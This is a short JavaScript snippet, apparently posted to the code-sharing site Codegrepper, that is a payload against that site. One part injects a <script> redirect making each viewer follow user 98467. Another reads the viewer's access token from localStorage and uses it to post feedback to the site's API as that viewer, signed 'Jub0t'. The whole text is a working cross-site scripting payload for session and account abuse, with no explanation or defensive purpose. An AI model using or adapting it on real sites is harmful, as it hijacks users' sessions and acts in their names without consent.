document.getElementById("followButton").click();
<script>window.location.href = `/api/follow.php?follow_user_id=98467&follow=1`</script>

async function SendFeedback() {
    token = localStorage.getItem("access_token")
    await fetch(`https://www.codegrepper.com/api/send_feedback.php`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'x-auth-token:': token
        },
        body: JSON.stringify({
            "feedback": "FeedBack By Jub0t Testing Stuff.."
        }),
    })
        .then((res) => res.json())
        .then((data) => {
            console.log('Success:', data);
        })
        .catch((err) => console.log(err));
} SendFeedback()